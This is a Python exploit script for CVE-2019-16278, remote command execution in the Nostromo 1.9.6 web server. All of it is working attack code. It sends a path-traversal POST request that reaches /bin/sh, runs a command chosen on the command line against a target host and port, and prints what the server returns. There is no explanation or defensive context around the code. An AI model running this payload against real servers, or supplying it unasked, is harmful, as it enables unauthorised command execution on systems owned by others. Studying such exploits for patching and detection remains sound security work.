import argparse
import socket

# Setup Argparse
parser = argparse.ArgumentParser(description="Exploit for CVE-2019-16278 - Nostromo 1.9.6 RCE")
parser.add_argument("-t", "--target", help="Remote host to target")
parser.add_argument("-p", "--port", help="Remote port to target")
parser.add_argument("-c", "--command", help="Command to execute on the server")
parser.add_argument("-b", "--bytes", help="The number of bytes to receive back in the response")

# Define and assign the variables
args = parser.parse_args()
TARGET = args.target
PORT = int(args.port)
COMMAND = args.command
BYTES = args.bytes
URL = "/.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0"

# Check if the number of return bytes was passed in
if BYTES == None:
    BYTES=4096
else:
    BYTES=int(BYTES)

# Build the payload
payload = URL+"\r\n"
payload += "Content-Length: 1\r\n\r\n"
payload += "echo\necho\n"+COMMAND+" 2>&1"

# Create the socket and send the payload
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET,PORT))
s.send("POST " + payload)

# Receive the response and close the socket
print(s.recv(1024))
print(s.recv(BYTES))
s.close()
